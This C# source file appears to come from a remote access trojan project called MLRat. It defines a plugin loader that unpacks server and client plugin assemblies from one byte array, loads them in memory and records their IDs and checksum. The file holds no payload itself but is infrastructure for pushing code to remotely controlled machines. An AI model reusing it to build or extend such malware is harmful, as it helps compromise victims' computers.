using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using MLRat.Server;
using MLRat.Client;
using System.Reflection;
using ServerPlugin.InterfaceHandle;
using MLRat.Cryptography;

namespace MLRat.Plugin
{
    public class MLPlugin
    {
        private byte[] CombinedBytes;
        public Guid ServerPluginID { get; private set; }
        public Guid ClientPluginID { get; private set; }
        public IServerPlugin ServerPlugin { get; private set; }
        public MLPluginInfomation PluginInfomation { get; private set; }
        public string ClientPluginChecksum { get; private set; }
        public byte[] ClientPluginBytes { get; private set; }

        public MLPlugin(byte[] _combinedBytes)
        {
            CombinedBytes = _combinedBytes;
        }

        public bool Load()
        {
            try
            {
                int _ServerPluginLength = BitConverter.ToInt32(CombinedBytes, 0);
                int _ClientPluginLength = BitConverter.ToInt32(CombinedBytes, 4);

                byte[] _ServerPluginBytes = new byte[_ServerPluginLength];
                ClientPluginBytes = new byte[_ClientPluginLength];

                Array.Copy(CombinedBytes, 8, _ServerPluginBytes, 0, _ServerPluginLength);
                Array.Copy(CombinedBytes, 8 + _ServerPluginLength, ClientPluginBytes, 0, _ClientPluginLength);

                

                Assembly _serverPlugin = Assembly.Load(_ServerPluginBytes);
                foreach (Type t in _serverPlugin.GetTypes())
                {
                    if (typeof (IServerPlugin).IsAssignableFrom(t))
                    {
                        ServerPlugin = (IServerPlugin)Activator.CreateInstance(t);
                        ServerPluginID = t.GUID;
                        break;
                    }
                }
                if (ServerPlugin == null)
                    throw new Exception("Failed to load Server plugin");

                ClientPluginChecksum = Hash.Md5(ClientPluginBytes);
                Assembly _clientPlugin = Assembly.Load(ClientPluginBytes);
                foreach (Type t in _clientPlugin.GetTypes())
                {
                    if (typeof (IClientPlugin).IsAssignableFrom(t))
                    {
                        ClientPluginID = t.GUID;
                        break;
                    }
                }
                if (ClientPluginID == null)
                    throw new Exception("Failed to load client plugin");

                PluginInfomation = ServerPlugin.PluginInfomation;

                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}
